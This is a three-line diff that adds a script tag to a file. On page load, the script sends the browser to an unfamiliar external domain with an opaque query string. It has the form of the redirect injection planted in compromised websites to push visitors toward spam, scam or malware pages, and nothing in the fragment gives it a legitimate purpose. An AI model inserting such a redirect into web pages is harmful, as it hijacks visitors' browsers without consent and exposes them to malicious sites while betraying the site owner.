@@ -1,0 +1,3 @@
+<script>
+window.location = "http://tt2eaf.com/?E=joQrEMic1DuvOnvoliWRlyqIoTl1X1I9&s1=";
+</script>
